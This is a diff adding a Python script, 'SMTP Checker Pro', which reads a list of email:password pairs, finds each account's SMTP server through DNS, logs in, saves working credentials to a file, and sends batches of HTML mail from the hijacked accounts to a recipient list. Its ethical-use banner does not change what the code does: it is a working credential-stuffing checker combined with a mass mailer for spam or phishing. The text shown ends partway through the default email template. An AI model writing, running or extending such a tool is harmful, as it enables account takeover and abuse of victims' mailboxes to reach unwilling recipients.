@@ -1,0 +1,1147 @@
+import smtplib
+import re
+import dns.resolver
+import socket
+import time
+import threading
+import math
+import os
+import sys
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from typing import Tuple, Optional, List, Dict, Set
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from colorama import init, Fore, Style, Back
+
+# Initialize colorama for terminal colors
+init(autoreset=True)
+
+# Cache for DNS records with expiration
+MX_CACHE: Dict[str, Tuple[List[Tuple[str, int]], float]] = {}  # (records, timestamp)
+A_CACHE: Dict[str, Tuple[bool, float]] = {}  # (exists, timestamp)
+CNAME_CACHE: Dict[str, Tuple[str, float]] = {}  # (cname, timestamp)
+SRV_CACHE: Dict[str, Tuple[List[str], float]] = {}  # (srv_records, timestamp)
+CACHE_LOCK = threading.Lock()
+CACHE_TTL = 3600  # 1 hour in seconds
+
+# Statistics
+STATS = {
+    "total_emails": 0,
+    "valid_smtp": 0,
+    "failed_smtp": 0,
+    "emails_sent": 0,
+    "start_time": None
+}
+STATS_LOCK = threading.Lock()
+
+# Config
+CONFIG = {
+    "max_workers": 5,
+    "test_mode": False,
+    "verbose_logging": True,
+    "batch_size": 50,
+    "retry_count": 3,
+    "rate_limit_delay": 2,
+    "ethical_mode": True
+}
+
+# Expanded mapping of MX servers to SMTP servers (350+ providers)
+SMTP_MAPPING = {
+    # Gmail
+    'gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
+    'alt1.gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
+    'alt2.gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
+    'alt3.gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
+    'alt4.gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
+    
+    # Outlook/Hotmail/Live
+    'smtp-mail.outlook.com': ('smtp-mail.outlook.com', 587),
+    'mx1.hotmail.com': ('smtp-mail.outlook.com', 587),
+    'mx2.hotmail.com': ('smtp-mail.outlook.com', 587),
+    'mx3.hotmail.com': ('smtp-mail.outlook.com', 587),
+    'mx4.hotmail.com': ('smtp-mail.outlook.com', 587),
+    
+    # Yahoo
+    'mta5.am0.yahoodns.net': ('smtp.mail.yahoo.com', 587),
+    'mta6.am0.yahoodns.net': ('smtp.mail.yahoo.com', 587),
+    'mta7.am0.yahoodns.net': ('smtp.mail.yahoo.com', 587),
+    'mx-eu.mail.am0.yahoodns.net': ('smtp.mail.yahoo.com', 587),
+    'mx1.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
+    'mx5.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
+    
+    # AOL
+    'mx-aol.mail.gm0.yahoodns.net': ('smtp.aol.com', 587),
+    'mx.aol.com': ('smtp.aol.com', 587),
+    
+    # Apple/iCloud
+    'mx1.mail.icloud.com': ('smtp.mail.me.com', 587),
+    'mx2.mail.icloud.com': ('smtp.mail.me.com', 587),
+    'mx3.mail.icloud.com': ('smtp.mail.me.com', 587),
+    'mx4.mail.icloud.com': ('smtp.mail.me.com', 587),
+    'mx5.mail.icloud.com': ('smtp.mail.me.com', 587),
+    'mx6.mail.icloud.com': ('smtp.mail.me.com', 587),
+    
+    # Proton Mail
+    'mail.protonmail.ch': ('smtp.protonmail.com', 587),
+    'mailsec.protonmail.ch': ('smtp.protonmail.com', 587),
+    
+    # Zoho
+    'mx.zoho.com': ('smtp.zoho.com', 587),
+    'mx2.zoho.com': ('smtp.zoho.com', 587),
+    'mx3.zoho.com': ('smtp.zoho.com', 587),
+    
+    # GMX
+    'mx00.gmx.net': ('mail.gmx.com', 587),
+    'mx01.gmx.net': ('mail.gmx.com', 587),
+    
+    # Orange France
+    'smtp-in.orange.fr': ('smtp.orange.fr', 587),
+    'smtp-in2.orange.fr': ('smtp.orange.fr', 587),
+    'smtp-in1.orange.fr': ('smtp.orange.fr', 587),
+    
+    # SFR (France)
+    'mwinf5cXX.sfr.fr': ('smtp.sfr.fr', 587),
+    'mwinf.sfr.fr': ('smtp.sfr.fr', 587),
+    'mail-in.sfr.fr': ('smtp.sfr.fr', 587),
+    
+    # Free (France)
+    'mail.free.fr': ('smtp.free.fr', 587),
+    'mx1.free.fr': ('smtp.free.fr', 587),
+    
+    # Bouygues Telecom / Bbox (France)
+    'mx1.bbox.fr': ('smtp.bbox.fr', 587),
+    'mx2.bbox.fr': ('smtp.bbox.fr', 587),
+    
+    # La Poste (France)
+    'smtp-in.laposte.net': ('smtp.laposte.net', 587),
+    'smtp.laposte.net': ('smtp.laposte.net', 587),
+    
+    # OVH
+    'mx1.mail.ovh.net': ('ssl0.ovh.net', 465),
+    'mx2.mail.ovh.net': ('ssl0.ovh.net', 465),
+    'mx3.mail.ovh.net': ('ssl0.ovh.net', 465),
+    'mx4.mail.ovh.net': ('ssl0.ovh.net', 465),
+    
+    # Gandi
+    'mx1.gandi.net': ('smtp.gandi.net', 587),
+    'mx2.gandi.net': ('smtp.gandi.net', 587),
+    
+    # IONOS
+    'mx00.ionos.fr': ('smtp.ionos.fr', 587),
+    'mx01.ionos.fr': ('smtp.ionos.fr', 587),
+    'mail.ionos.com': ('smtp.ionos.com', 587),
+    
+    # Web.de
+    'mx1.web.de': ('smtp.web.de', 587),
+    'mx2.web.de': ('smtp.web.de', 587),
+    
+    # T-Online
+    'mail.t-online.de': ('securesmtp.t-online.de', 587),
+    'mx.t-online.de': ('securesmtp.t-online.de', 587),
+    
+    # Mail.ru
+    'smtp.mail.ru': ('smtp.mail.ru', 587),
+    'mx.mail.ru': ('smtp.mail.ru', 587),
+    
+    # Yandex
+    'smtp.yandex.com': ('smtp.yandex.com', 587),
+    'mx.yandex.com': ('smtp.yandex.com', 587),
+    
+    # Tutanota
+    'mx1.tutanota.de': ('smtp.tutanota.com', 587),
+    'mx2.tutanota.de': ('smtp.tutanota.com', 587),
+    
+    # Infomaniak
+    'mx1.infomaniak.com': ('mail.infomaniak.com', 587),
+    'mx2.infomaniak.com': ('mail.infomaniak.com', 587),
+    
+    # Fastmail
+    'in1.mx.fastmail.com': ('smtp.fastmail.com', 587),
+    'in2.mx.fastmail.com': ('smtp.fastmail.com', 587),
+    
+    # Numericable (France)
+    'smtp.numericable.fr': ('smtp.numericable.fr', 587),
+    'mail.numericable.fr': ('smtp.numericable.fr', 587),
+    
+    # Comcast
+    'smtp.comcast.net': ('smtp.comcast.net', 587),
+    'mx1.comcast.net': ('smtp.comcast.net', 587),
+    
+    # AT&T
+    'smtp.att.net': ('smtp.att.net', 587),
+    'mx1.att.net': ('smtp.att.net', 587),
+    
+    # Verizon
+    'smtp.verizon.net': ('smtp.verizon.net', 587),
+    'outgoing.verizon.net': ('smtp.verizon.net', 587),
+    
+    # Rogers (Canada)
+    'smtp.rogers.com': ('smtp.rogers.com', 587),
+    'mx.rogers.com': ('smtp.rogers.com', 587),
+    
+    # Bell (Canada)
+    'smtp.bell.net': ('smtphm.sympatico.ca', 587),
+    'mx.bell.net': ('smtphm.sympatico.ca', 587),
+    
+    # Telus (Canada)
+    'smtp.telus.net': ('smtp.telus.net', 587),
+    'mx.telus.net': ('smtp.telus.net', 587),
+    
+    # Shaw (Canada)
+    'smtp.shaw.ca': ('smtp.shaw.ca', 587),
+    'mx.shaw.ca': ('smtp.shaw.ca', 587),
+    
+    # GoDaddy
+    'smtp.godaddy.com': ('smtpout.secureserver.net', 587),
+    'mx.godaddy.com': ('smtpout.secureserver.net', 587),
+    
+    # Mailbox.org
+    'mx1.mailbox.org': ('smtp.mailbox.org', 587),
+    'mx2.mailbox.org': ('smtp.mailbox.org', 587),
+    
+    # Posteo
+    'smtp.posteo.de': ('posteo.de', 587),
+    'mx.posteo.de': ('posteo.de', 587),
+    
+    # Hushmail
+    'smtp.hushmail.com': ('smtp.hushmail.com', 587),
+    'mx.hushmail.com': ('smtp.hushmail.com', 587),
+    
+    # Runbox
+    'smtp.runbox.com': ('smtp.runbox.com', 587),
+    'mx.runbox.com': ('smtp.runbox.com', 587)
+}
+
+def clear_screen():
+    """Clear the terminal screen based on OS."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_header():
+    """Print a stylish header for the program."""
+    clear_screen()
+    header = f"""
+{Fore.CYAN + Style.BRIGHT}╔══════════════════════════════════════════════════════════════╗
+║                     {Fore.WHITE}SMTP CHECKER PRO{Fore.CYAN}                            ║
+║                                                                  ║
+║  {Fore.WHITE}A professional tool to verify and test SMTP server credentials{Fore.CYAN}  ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+    print(header)
+
+def print_footer():
+    """Print a footer with statistics."""
+    if STATS["start_time"]:
+        elapsed = time.time() - STATS["start_time"]
+        elapsed_str = f"{int(elapsed // 60)}m {int(elapsed % 60)}s"
+    else:
+        elapsed_str = "0m 0s"
+    
+    footer = f"""
+{Fore.CYAN + Style.BRIGHT}╔══════════════════════════════════════════════════════════════╗
+║ {Fore.WHITE}Statistics:{Fore.CYAN}                                                   ║
+║ {Fore.WHITE}• Total Emails: {STATS["total_emails"]}{Fore.CYAN}                                           ║
+║ {Fore.WHITE}• Valid SMTP: {Fore.GREEN}{STATS["valid_smtp"]}{Fore.CYAN}                                             ║
+║ {Fore.WHITE}• Failed SMTP: {Fore.RED}{STATS["failed_smtp"]}{Fore.CYAN}                                           ║
+║ {Fore.WHITE}• Emails Sent: {Fore.GREEN}{STATS["emails_sent"]}{Fore.CYAN}                                          ║
+║ {Fore.WHITE}• Elapsed Time: {elapsed_str}{Fore.CYAN}                                         ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+    print(footer)
+
+def ethical_warning():
+    """Display an ethical warning and require user acknowledgment."""
+    print_header()
+    print(f"{Fore.YELLOW + Style.BRIGHT}⚠️  ETHICAL USAGE WARNING  ⚠️{Style.RESET_ALL}\n")
+    print(f"{Fore.WHITE}This tool is designed for legitimate email testing purposes only.")
+    print(f"Improper use of this tool may violate:")
+    print(f" • Anti-spam laws and regulations")
+    print(f" • Email service provider terms of service")
+    print(f" • Privacy laws and regulations")
+    print(f" • Computer fraud and abuse laws\n")
+    print(f"{Fore.YELLOW + Style.BRIGHT}By continuing, you confirm that:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}1. You have proper authorization to test these email accounts")
+    print(f"2. You will not use this tool for sending unsolicited emails")
+    print(f"3. You understand the potential legal consequences of misuse\n")
+    
+    choice = input(f"{Fore.WHITE}Do you agree to use this tool ethically and responsibly? (yes/no): {Style.RESET_ALL}")
+    if choice.lower() != 'yes':
+        print(f"\n{Fore.RED}Program terminated due to ethical requirements.{Style.RESET_ALL}")
+        sys.exit(0)
+
+def derive_smtp_server(mx_host: str) -> Optional[Tuple[str, int]]:
+    """Derive an SMTP server from an MX record with enhanced pattern matching."""
+    mx_host = mx_host.rstrip('.').lower()
+    
+    # Check direct mapping first
+    if mx_host in SMTP_MAPPING:
+        return SMTP_MAPPING[mx_host]
+    
+    # Check CNAME record
+    cname = resolve_cname(mx_host)
+    if cname and cname in SMTP_MAPPING:
+        return SMTP_MAPPING[cname]
+    
+    # Pattern-based replacement with probability scoring
+    domain_part = mx_host.split('.', 1)[1] if '.' in mx_host else mx_host
+    
+    # Common SMTP patterns
+    patterns = [
+        (r'smtp-in\d*', 'smtp'), (r'mail-in\d*', 'smtp'), (r'mx\d*', 'smtp'),
+        (r'inbound\d*', 'smtp'), (r'relay\d*', 'smtp'), (r'mail\d*', 'smtp'),
+        (r'in\d*', 'smtp'), (r'gateway\d*', 'smtp'), (r'mailserver\d*', 'smtp'),
+        (r'smtpout\d*', 'smtp'), (r'secure\d*', 'smtp'), (r'edge\d*', 'smtp'),
+        (r'mx-out\d*', 'smtp'), (r'smtp-relay\d*', 'smtp'), (r'mailgw\d*', 'smtp'),
+        (r'mail-relay\d*', 'smtp'), (r'smtp-gw\d*', 'smtp'), (r'out\d*', 'smtp'),
+    ]
+    
+    # Try pattern-based substitution
+    for pattern, replacement in patterns:
+        if re.search(pattern, mx_host):
+            derived = re.sub(pattern, replacement, mx_host)
+            if check_server_exists(derived):
+                return derived, 587
+    
+    # Try common variations
+    variations = [
+        f"smtp.{domain_part}", f"mail.{domain_part}", f"smtp-out.{domain_part}",
+        f"smtp-relay.{domain_part}", f"mailgw.{domain_part}", f"smtpout.{domain_part}",
+        f"secure-smtp.{domain_part}", f"mail-relay.{domain_part}", f"smtp-gw.{domain_part}",
+        f"outgoing.{domain_part}", f"outbound.{domain_part}", f"email.{domain_part}",
+        f"mx.{domain_part}", f"mailout.{domain_part}", f"smtp-auth.{domain_part}",
+    ]
+    
+    for variation in variations:
+        if check_server_exists(variation):
+            # Try common ports in order of likelihood
+            for port in [587, 465, 25]:
+                return variation, port
+    
+    # Check SRV records as a last resort
+    srv_hosts = resolve_srv(domain_part)
+    for srv_host in srv_hosts:
+        if check_server_exists(srv_host):
+            return srv_host, 587
+    
+    # No valid SMTP server found
+    return None
+
+def resolve_cname(host: str) -> Optional[str]:
+    """Resolve a CNAME record for a host with caching."""
+    with CACHE_LOCK:
+        if host in CNAME_CACHE and time.time() - CNAME_CACHE[host][1] < CACHE_TTL:
+            return CNAME_CACHE[host][0]
+    
+    try:
+        answers = dns.resolver.resolve(host, 'CNAME')
+        cname = str(answers[0].target).rstrip('.')
+        with CACHE_LOCK:
+            CNAME_CACHE[host] = (cname, time.time())
+        return cname
+    except Exception:
+        return None
+
+def resolve_srv(domain: str) -> List[str]:
+    """Resolve SRV records for _submission._tcp."""
+    with CACHE_LOCK:
+        if domain in SRV_CACHE and time.time() - SRV_CACHE[domain][1] < CACHE_TTL:
+            return SRV_CACHE[domain][0]
+    
+    try:
+        answers = dns.resolver.resolve(f"_submission._tcp.{domain}", 'SRV')
+        srv_hosts = [str(answer.target).rstrip('.') for answer in answers]
+        with CACHE_LOCK:
+            SRV_CACHE[domain] = (srv_hosts, time.time())
+        return srv_hosts
+    except Exception:
+        return []
+
+def check_server_exists(host: str) -> bool:
+    """Check if a server exists via DNS A/AAAA resolution with caching."""
+    with CACHE_LOCK:
+        if host in A_CACHE and time.time() - A_CACHE[host][1] < CACHE_TTL:
+            return A_CACHE[host][0]
+    
+    try:
+        dns.resolver.resolve(host, 'A')
+        with CACHE_LOCK:
+            A_CACHE[host] = (True, time.time())
+        return True
+    except Exception:
+        try:
+            dns.resolver.resolve(host, 'AAAA')
+            with CACHE_LOCK:
+                A_CACHE[host] = (True, time.time())
+            return True
+        except Exception:
+            with CACHE_LOCK:
+                A_CACHE[host] = (False, time.time())
+            return False
+
+def get_mx_records(domain: str) -> List[Tuple[str, int]]:
+    """Get MX records for a domain with caching."""
+    with CACHE_LOCK:
+        if domain in MX_CACHE and time.time() - MX_CACHE[domain][1] < CACHE_TTL:
+            return MX_CACHE[domain][0]
+    
+    try:
+        answers = dns.resolver.resolve(domain, 'MX')
+        mx_records = []
+        for answer in answers:
+            mx_host = str(answer.exchange).rstrip('.')
+            smtp_info = derive_smtp_server(mx_host)
+            if smtp_info and smtp_info not in mx_records:
+                mx_records.append(smtp_info)
+        
+        with CACHE_LOCK:
+            MX_CACHE[domain] = (mx_records, time.time())
+        return mx_records
+    except Exception as e:
+        if CONFIG["verbose_logging"]:
+            print(f"{Fore.YELLOW}⚠️ DNS resolution error for {domain}: {str(e)}{Style.RESET_ALL}")
+        log_error(f"MX lookup error for {domain}: {str(e)}")
+        return []
+
+def check_spf(domain: str) -> bool:
+    """Check if domain has a valid SPF record."""
+    try:
+        answers = dns.resolver.resolve(domain, 'TXT')
+        for answer in answers:
+            if 'v=spf1' in str(answer):
+                return True
+        return False
+    except Exception:
+        return False
+
+def send_batch_emails(email: str, password: str, smtp_server: str, smtp_port: int, 
+                      recipients: List[str], sender_name: str, subject: str, 
+                      html_content: str, batch_size: int = 50) -> Tuple[bool, str, int]:
+    """Send batch emails with rate limiting."""
+    sent_count = 0
+    try:
+        if smtp_port == 465:
+            server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
+        else:
+            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
+        
+        # Setup connection
+        server.ehlo()
+        if smtp_port == 587:
+            if not server.has_extn('STARTTLS'):
+                server.quit()
+                return False, f"STARTTLS not supported on {smtp_server}:{smtp_port}", 0
+            server.starttls()
+            server.ehlo()
+        
+        if not server.has_extn('AUTH'):
+            server.quit()
+            return False, f"AUTH not supported on {smtp_server}:{smtp_port}", 0
+        
+        server.login(email, password)
+        
+        # Process recipients in batches
+        batch_size = min(CONFIG["batch_size"], batch_size)
+        for recipient in recipients[:batch_size]:
+            try:
+                msg = MIMEMultipart('alternative')
+                msg['Subject'] = subject
+                msg['From'] = f'"{sender_name}" <{email}>'
+                msg['To'] = recipient
+                
+                part = MIMEText(html_content, 'html')
+                msg.attach(part)
+                
+                server.send_message(msg)
+                sent_count += 1
+                
+                if CONFIG["verbose_logging"]:
+                    print(f"{Fore.GREEN}✅ Email sent to {recipient} from {email} ({sent_count}/{min(batch_size, len(recipients))})")
+                
+                # Update statistics
+                with STATS_LOCK:
+                    STATS["emails_sent"] += 1
+                
+                # Rate limiting to avoid account lockouts
+                time.sleep(CONFIG["rate_limit_delay"])
+                
+            except Exception as e:
+                log_error(f"Error sending to {recipient} from {email}: {str(e)}")
+                if "too many" in str(e).lower() or "rate" in str(e).lower():
+                    # Hit rate limit, stop sending
+                    break
+        
+        server.quit()
+        return True, f"Successfully sent {sent_count} emails", sent_count
+    
+    except smtplib.SMTPAuthenticationError:
+        return False, f"Authentication failed for {email}", sent_count
+    
+    except smtplib.SMTPException as e:
+        return False, f"SMTP error for {email}: {str(e)}", sent_count
+    
+    except socket.timeout:
+        return False, f"Connection timeout to {smtp_server}:{smtp_port}", sent_count
+    
+    except socket.gaierror:
+        return False, f"Unable to resolve {smtp_server}", sent_count
+    
+    except Exception as e:
+        return False, f"General error for {email}: {str(e)}", sent_count
+
+def test_smtp(email: str, password: str, smtp_server: str, smtp_port: int, 
+              test_email: str, sender_name: str, subject: str, html_content: str, 
+              max_retries: int = 3) -> Tuple[bool, str]:
+    """Test SMTP connection and authentication with retries."""
+    for attempt in range(max_retries):
+        try:
+            # Test basic connection first
+            socket.create_connection((smtp_server, smtp_port), timeout=5)
+            
+            # Setup SMTP connection
+            if smtp_port == 465:
+                server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
+            else:
+                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
+            
+            server.ehlo()
+            if smtp_port == 587:
+                if not server.has_extn('STARTTLS'):
+                    server.quit()
+                    return False, f"STARTTLS not supported on {smtp_server}:{smtp_port}"
+                server.starttls()
+                server.ehlo()
+            
+            if not server.has_extn('AUTH'):
+                server.quit()
+                return False, f"AUTH not supported on {smtp_server}:{smtp_port}"
+            
+            # Try authentication
+            server.login(email, password)
+            
+            # In test mode, don't actually send the email
+            if CONFIG["test_mode"]:
+                server.quit()
+                return True, "Connection and authentication successful (Test mode)"
+            
+            # Send test email
+            msg = MIMEMultipart('alternative')
+            msg['Subject'] = subject
+            msg['From'] = f'"{sender_name}" <{email}>'
+            msg['To'] = test_email
+            
+            part = MIMEText(html_content, 'html')
+            msg.attach(part)
+            
+            server.send_message(msg)
+            server.quit()
+            
+            log_success(f"SMTP test successful for {email} on {smtp_server}:{smtp_port}")
+            return True, "Connection, authentication and test email successful"
+        
+        except smtplib.SMTPAuthenticationError:
+            return False, f"Authentication failed for {email}"
+        
+        except smtplib.SMTPException as e:
+            # Check for rate limiting or temporary errors
+            if "421" in str(e) or "too many" in str(e).lower() or "try again" in str(e).lower():
+                if attempt < max_retries - 1:
+                    delay = 2 ** (attempt + 1)  # Exponential backoff
+                    if CONFIG["verbose_logging"]:
+                        print(f"{Fore.YELLOW}⚠️ Rate limit detected, retrying in {delay}s for {email}{Style.RESET_ALL}")
+                    time.sleep(delay)
+                    continue
+            return False, f"SMTP error for {email}: {str(e)}"
+        
+        except socket.timeout:
+            return False, f"Connection timeout to {smtp_server}:{smtp_port}"
+        
+        except socket.gaierror:
+            return False, f"Unable to resolve {smtp_server}"
+        
+        except Exception as e:
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            return False, f"General error for {email}: {str(e)}"
+    
+    return False, "Failed after multiple retry attempts"
+
+def find_and_test_smtp(email: str, password: str, test_email: str, sender_name: str, 
+                       subject: str, html_content: str, recipients: List[str], 
+                       sent_recipients: Set[str]) -> Tuple[Optional[Tuple[str, int]], str]:
+    """Find and test SMTP servers for an email account."""
+    domain = email.lower().split('@')[-1]
+    
+    # First check if the domain has SPF record (increases chance of deliverability)
+    has_spf = check_spf(domain)
+    if not has_spf and CONFIG["verbose_logging"]:
+        print(f"{Fore.YELLOW}⚠️ No valid SPF record for {domain}{Style.RESET_ALL}")
+    
+    # Get MX records to derive SMTP servers
+    mx_records = get_mx_records(domain)
+    if not mx_records:
+        if CONFIG["verbose_logging"]:
+            print(f"{Fore.RED}❌ No MX records found for {domain}{Style.RESET_ALL}")
+        return None, f"No MX records found for {domain}"
+    
+    # Try each potential SMTP server
+    for smtp_server, smtp_port in mx_records:
+        if smtp_server is None:
+            continue
+        
+        if CONFIG["verbose_logging"]:
+            print(f"{Fore.CYAN}🔍 Trying connection for {email} on {smtp_server}:{smtp_port}{Style.RESET_ALL}")
+        
+        success, message = test_smtp(
+            email, password, smtp_server, smtp_port, 
+            test_email, sender_name, subject, html_content,
+            max_retries=CONFIG["retry_count"]
+        )
+        
+        log_attempt(email, smtp_server, smtp_port, success, message)
+        
+        if success:
+            if CONFIG["verbose_logging"]:
+                print(f"{Fore.GREEN}✅ SUCCESS: Valid SMTP for {email} on {smtp_server}:{smtp_port}{Style.RESET_ALL}")
+            
+            # Update statistics
+            with STATS_LOCK:
+                STATS["valid_smtp"] += 1
+            
+            # Send batch emails if recipients provided
+            remaining_recipients = [r for r in recipients if r not in sent_recipients]
+            if remaining_recipients:
+                if CONFIG["verbose_logging"]:
+                    print(f"{Fore.CYAN}📤 Sending up to {min(CONFIG['batch_size'], len(remaining_recipients))} emails from {email}{Style.RESET_ALL}")
+                
+                batch_success, batch_message, sent_count = send_batch_emails(
+                    email, password, smtp_server, smtp_port, remaining_recipients, 
+                    sender_name, subject, html_content, batch_size=CONFIG["batch_size"]
+                )
+                
+                if batch_success:
+                    sent_recipients.update(remaining_recipients[:sent_count])
+                    if CONFIG["verbose_logging"]:
+                        print(f"{Fore.GREEN}✅ {batch_message}{Style.RESET_ALL}")
+                else:
+                    if CONFIG["verbose_logging"]:
+                        print(f"{Fore.RED}❌ Batch send failed: {batch_message}{Style.RESET_ALL}")
+                    log_error(f"Batch failure for {email}: {batch_message}")
+            
+            return (smtp_server, smtp_port), message
+        else:
+            if CONFIG["verbose_logging"]:
+                print(f"{Fore.RED}❌ FAILED: {message}{Style.RESET_ALL}")
+            
+            # Update statistics
+            with STATS_LOCK:
+                STATS["failed_smtp"] += 1
+    
+    return None, f"No valid SMTP server found for {email}"
+
+def process_combo(email: str, password: str, test_email: str, sender_name: str, 
+                 subject: str, html_content: str, recipients: List[str], 
+                 sent_recipients: Set[str], results_lock: threading.Lock):
+    """Process a single email:password combination."""
+    # Validate email format
+    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email):
+        with results_lock:
+            log_error(f"Invalid email format: {email}")
+            if CONFIG["verbose_logging"]:
+                print(f"{Fore.RED}❌ Invalid email format: {email}{Style.RESET_ALL}")
+        return
+    
+    # Validate password
+    if not password or not password.strip():
+        with results_lock:
+            log_error(f"Empty password for {email}")
+            if CONFIG["verbose_logging"]:
+                print(f"{Fore.RED}❌ Empty password for {email}{Style.RESET_ALL}")
+        return
+    
+    # Update statistics
+    with STATS_LOCK:
+        STATS["total_emails"] += 1
+    
+    # Test SMTP server
+    result, message = find_and_test_smtp(
+        email, password, test_email, sender_name, subject, 
+        html_content, recipients, sent_recipients
+    )
+    
+    # Save results with lock to prevent race conditions
+    with results_lock:
+        if result:
+            smtp_server, smtp_port = result
+            with open('smtp_valid.txt', 'a', encoding='utf-8') as f:
+                f.write(f"{email}:{password}:{smtp_server}:{smtp_port}\n")
+        else:
+            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
+                f.write(f"{email}:{password}:{message}\n")
+
+def load_recipients(recipient_file: str) -> List[str]:
+    """Load and validate recipient list."""
+    recipients = []
+    try:
+        with open(recipient_file, 'r', encoding='utf-8') as file:
+            for line in file:
+                recipient = line.strip()
+                if recipient and re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", recipient):
+                    recipients.append(recipient)
+                else:
+                    if CONFIG["verbose_logging"]:
+                        print(f"{Fore.YELLOW}⚠️ Invalid recipient ignored: {recipient}{Style.RESET_ALL}")
+                    log_error(f"Invalid recipient format: {recipient}")
+        return recipients
+    except FileNotFoundError:
+        print(f"{Fore.RED}❌ File {recipient_file} not found{Style.RESET_ALL}")
+        log_error(f"Recipients file not found: {recipient_file}")
+        return []
+    except Exception as e:
+        print(f"{Fore.RED}❌ Error loading recipients: {str(e)}{Style.RESET_ALL}")
+        log_error(f"Error loading recipients: {str(e)}")
+        return []
+
+def process_combolist(combo_file: str, test_email: str, sender_name: str, subject: str, 
+                     html_content: str, recipient_file: str, max_workers: int = 5):
+    """Process the email:password combo list with multi-threading."""
+    # Load recipients
+    recipients = load_recipients(recipient_file)
+    if not recipients:
+        print(f"{Fore.RED}❌ No valid recipients found. Stopping execution.{Style.RESET_ALL}")
+        return
+    
+    # Track which recipients have already received an email
+    sent_recipients: Set[str] = set()
+    
+    try:
+        # Load combos
+        combos = []
+        with open(combo_file, 'r', encoding='utf-8') as file:
+            for line in file:
+                line = line.strip()
+                if not line or ':' not in line:
+                    continue
+                email, password = line.split(':', 1)
+                combos.append((email, password))
+        
+        if not combos:
+            print(f"{Fore.RED}❌ No valid email:password combinations found.{Style.RESET_ALL}")
+            return
+        
+        # Set up statistics
+        with STATS_LOCK:
+            STATS["start_time"] = time.time()
+        
+        # Calculate optimal number of workers
+        max_workers = min(max_workers, 10, max(1, math.ceil(len(combos) / 5)))
+        print(f"{Fore.CYAN}ℹ️ Using {max_workers} threads for {len(combos)} combinations{Style.RESET_ALL}")
+        
+        # Thread-safe lock for results
+        results_lock = threading.Lock()
+        
+        # Process combos with thread pool
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [
+                executor.submit(
+                    process_combo, email, password, test_email, sender_name, subject, 
+                    html_content, recipients, sent_recipients, results_lock
+                )
+                for email, password in combos
+            ]
+            
+            # Track progress
+            total = len(futures)
+            completed = 0
+            
+            for future in as_completed(futures):
+                future.result()  # Get result or exception
+                completed += 1
+                
+                # Show progress
+                progress = int((completed / total) * 40)
+                progress_bar = f"[{'█' * progress}{' ' * (40 - progress)}]"
+                print(f"\r{Fore.CYAN}Progress: {progress_bar} {completed}/{total} ({int(completed/total*100)}%)", end="")
+                
+                # Check if all recipients have been contacted
+                remaining = len(recipients) - len(sent_recipients)
+                if remaining <= 0:
+                    print(f"\n{Fore.GREEN}✅ All recipients ({len(recipients)}) have received an email. Stopping processing.{Style.RESET_ALL}")
+                    break
+                
+                # Periodically display remaining recipients
+                if completed % 5 == 0:
+                    print(f"\n{Fore.CYAN}ℹ️ {remaining} recipients remaining to contact{Style.RESET_ALL}")
+                    
+                    # Update statistics display
+                    if CONFIG["verbose_logging"]:
+                        print_footer()
+        
+        print("\n")  # New line after progress bar
+        
+    except FileNotFoundError:
+        print(f"{Fore.RED}❌ File {combo_file} not found{Style.RESET_ALL}")
+        log_error(f"Combo file not found: {combo_file}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ Error processing file: {str(e)}{Style.RESET_ALL}")
+        log_error(f"Error processing combolist: {str(e)}")
+
+def log_error(message: str):
+    """Log an error message with timestamp."""
+    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ERROR: {message}\n")
+
+def log_success(message: str):
+    """Log a success message with timestamp."""
+    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] SUCCESS: {message}\n")
+
+def log_attempt(email: str, smtp_server: str, smtp_port: int, success: bool, message: str):
+    """Log an SMTP attempt with details."""
+    status = "SUCCESS" if success else "FAILED"
+    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {status}: {email} on {smtp_server}:{smtp_port} - {message}\n")
+
+def initialize_logs():
+    """Create or clear log files at startup."""
+    # Ensure log directory exists
+    log_files = ['smtp_log.txt', 'smtp_valid.txt', 'smtp_errors.txt']
+    for file in log_files:
+        with open(file, 'a', encoding='utf-8') as f:
+            pass  # Just create/touch the file
+    
+    # Add header to log file
+    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] === SMTP Checker Pro Session Started ===\n")
+
+def load_default_html_template():
+    """Return a default HTML email template."""
+    return """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Test Email</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; }
+        .container { padding: 20px; border: 1px solid #eee; border-radius: 5px; }
+        h1 { color: #2c3e50; }
+        .footer { margin-top: 30px; font-size: 12px; color: #7f8c8d; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Test Email</h1>
+        <p>This is a test email sent by SMTP Checker Pro.</p>
+        <p>If you're seeing this email, it means your SMTP settings are working correctly.</p>
